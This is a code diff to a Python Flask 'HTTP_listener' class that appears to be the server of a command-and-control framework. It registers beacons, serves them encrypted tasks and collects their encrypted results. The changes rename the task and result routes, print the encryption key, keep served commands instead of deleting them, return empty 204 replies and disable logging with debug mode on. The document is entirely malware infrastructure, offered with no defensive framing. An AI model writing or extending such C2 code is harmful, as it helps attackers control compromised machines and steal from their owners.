@@ -28,6 +28,8 @@ class HTTP_listener:
             self.key = key_init()
             self.stash.sql_stash( '''INSERT INTO key_store(enc_key, list_name) VALUES( ?, ? )''', (self.key, name) )
 
+        print(self.key)
+
         ## to fix - get auto folder you idiot
         html_fold = path.join(getcwd(), 'core' ,'html')
         self.app = Flask(__name__, template_folder=html_fold)
@@ -55,7 +57,7 @@ class HTTP_listener:
                                                          enc_key ) VALUES( ?, ?, ?, ?, ?, ? )''', fields )
             return (beacon_name, 200)
 
-        @self.app.route('/task/<name>', methods=['GET'])
+        @self.app.route('/tasks/<name>', methods=['GET'])
         def getinTask(name):
             task = self.stash.get_task(name)
             if task:
@@ -63,12 +65,13 @@ class HTTP_listener:
                 enc_comm = task[0][1]
                 send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', self.key)
 
-                self.stash.del_commands(com_code)
+                # self.stash.del_commands(com_code)
                 return (send_it, 200)
             else:
-                return (render_template(f'404.html', title = '404'), 404)
+                # return (render_template(f'404.html', title = '404'), 404)
+                return ('', 204)
         
-        @self.app.route('/result/<code>', methods=['POST'])
+        @self.app.route('/results/<code>', methods=['POST'])
         def ret_res(code):
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
@@ -95,8 +98,8 @@ class HTTP_listener:
 
     def run(self):
         # to fix (debug False and logger True)
-        self.app.logger.disabled = False
-        self.app.run(port=self.port, host=self.ip, debug=False)
+        self.app.logger.disabled = True
+        self.app.run(port=self.port, host=self.ip, debug=True)
 
     def start(self):
         self.server = Process(name = self.name, target=self.run, args = (), daemon = True)
